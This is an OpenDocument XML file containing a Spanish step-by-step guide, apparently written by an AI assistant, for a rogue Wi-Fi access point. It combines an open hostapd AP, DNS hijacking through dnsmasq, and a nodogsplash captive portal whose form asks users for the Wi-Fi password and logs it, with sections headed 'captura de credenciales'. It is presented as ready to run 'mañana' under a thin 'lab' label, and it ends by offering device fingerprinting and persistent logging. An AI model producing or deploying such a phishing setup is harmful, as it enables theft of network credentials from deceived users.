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MPLEMENTACIÓN COMPLETA. SIN RELLENO. LISTO PARA TENERLO OPERATIVO MAÑANA.</text:span></text:p>
      <text:p text:style-name="Text_20_body">Entorno asumido: Linux (Ubuntu/Debian/Kali). Tarjeta Wi-Fi con modo AP (nl80211). Todo en laboratorio.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">1. INSTALAR COMPONENTES</text:h>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo apt update</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo apt install hostapd dnsmasq nodogsplash iptables-persistent</text:span></text:p>
      <text:p text:style-name="Text_20_body">Deshabilitá servicios para configurarlos manualmente:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo systemctl stop hostapd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo systemctl stop dnsmasq</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">2. CONFIGURAR LA INTERFAZ WLAN0 PARA EL AP</text:h>
      <text:p text:style-name="Text_20_body">Edición en <text:span text:style-name="Source_20_Text">/etc/network/interfaces</text:span> o usando <text:span text:style-name="Source_20_Text">ip</text:span> directo.</text:p>
      <text:p text:style-name="Text_20_body">Método inmediato:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo ip link set wlan0 down</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo ip addr flush dev wlan0</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo ip addr add 10.1.1.1/24 dev wlan0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo ip link set wlan0 up</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">3. CONFIGURAR HOSTAPD (AP ABIERTO)</text:h>
      <text:p text:style-name="Text_20_body">Archivo: <text:span text:style-name="Source_20_Text">/etc/hostapd/hostapd.conf</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">interface=wlan0</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">driver=nl80211</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">ssid=LAB_WIFI</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">hw_mode=g</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">channel=6</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">wpa=0</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">auth_algs=1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">ignore_broadcast_ssid=0</text:span></text:p>
      <text:p text:style-name="Text_20_body">Activar hostapd apuntando al archivo:</text:p>
      <text:p text:style-name="Text_20_body">Edición: <text:span text:style-name="Source_20_Text">/etc/default/hostapd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">DAEMON_CONF="/etc/hostapd/hostapd.conf"</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">4. CONFIGURAR DNSMASQ (DHCP + DNS HIJACK)</text:h>
      <text:p text:style-name="Text_20_body">Mover config previa:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="Source_20_Text">sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak</text:span></text:p>
      <text:p text:style-name="Text_20_body">Nueva <text:span text:style-name="Source_20_Text">/etc/dnsmasq.conf</text:span>:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">interface=wlan0</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">dhcp-range=10.1.1.10,10.1.1.200,12h</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">address=/#/10.1.1.1</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">log-queries</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">log-dhcp</text:span></text:p>
      <text:p text:style-name="Text_20_body">Esto fuerza <text:span text:style-name="Strong_20_Emphasis">todo DNS</text:span> a 10.1.1.1 → portal.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">5. ACTIVAR NAT PARA DAR INTERNET DESPUÉS DEL PORTAL</text:h>
      <text:p text:style-name="Text_20_body">Asumiendo salida por <text:span text:style-name="Strong_20_Emphasis">eth0</text:span>:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo netfilter-persistent save</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">6. CONFIGURAR NODOGSPLASH (PORTAL)</text:h>
      <text:p text:style-name="Text_20_body">Archivo: <text:span text:style-name="Source_20_Text">/etc/nodogsplash/nodogsplash.conf</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">GatewayInterface wlan0</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">AuthServiceMode html</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">MaxClients 200</text:span></text:p>
      <text:p text:style-name="Text_20_body">Editar HTML del portal: <text:span text:style-name="Source_20_Text">/usr/share/nodogsplash/htdocs/login.html</text:span></text:p>
      <text:p text:style-name="Text_20_body">Ejemplo mínimo:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">&lt;form method="POST" action="/auth"&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>&lt;label&gt;Clave WiFi:&lt;/label&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>&lt;input type="text" name="psk"&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>&lt;input type="submit" value="Conectar"&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">&lt;/form&gt;</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">7. ACTIVAR LOS SERVICIOS EN ORDEN CORRECTO</text:h>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo systemctl restart dnsmasq</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">sudo systemctl restart hostapd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo systemctl restart nodogsplash</text:span></text:p>
      <text:p text:style-name="Text_20_body">Verificar puertos:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">netstat -tulpn | grep -E "hostapd|dnsmasq|nodog"</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"><text:soft-page-break/></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">8. VALIDAR FLUJO DEL CLIENTE</text:h>
      <text:list text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P6">Cliente ve “LAB_WIFI”.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Se conecta (sin clave).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Intento de navegación → Captive Portal automático.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Cliente ingresa “clave” → nodogsplash registra POST.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">En <text:span text:style-name="Source_20_Text">sudo tail -f /var/log/nodogsplash.log</text:span> se observa:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">POST /auth --&gt; psk=LO_QUE_INGRESO</text:span></text:p>
      <text:list text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P7">Cliente recibe acceso a Internet.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">9. DIAGNÓSTICOS RÁPIDOS</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Hostapd funcionando:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo journalctl -u hostapd -f</text:span></text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">DHCP entregado:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo tail -f /var/log/dnsmasq.log</text:span></text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Captura de credenciales:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">sudo tail -f /var/log/nodogsplash.log</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">10. LISTO PARA USAR MAÑANA</text:h>
      <text:p text:style-name="Text_20_body">Si seguiste los pasos:</text:p>
      <text:list text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P8">AP operativo</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8">DNS secuestrado</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8">Portal cautivo funcional</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8">Captura de lo ingresado</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8">Acceso otorgado automáticamente</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Si querés, próximo paso: diseño visual del portal, campos adicionales, fingerprinting del dispositivo y registro persistente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0:47:02.676965468</meta:creation-date>
    <dc:date>2025-11-20T11:11:27.633286151</dc:date>
    <meta:editing-duration>PT12M18S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="85" meta:word-count="367" meta:character-count="2777" meta:non-whitespace-character-count="2502"/>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>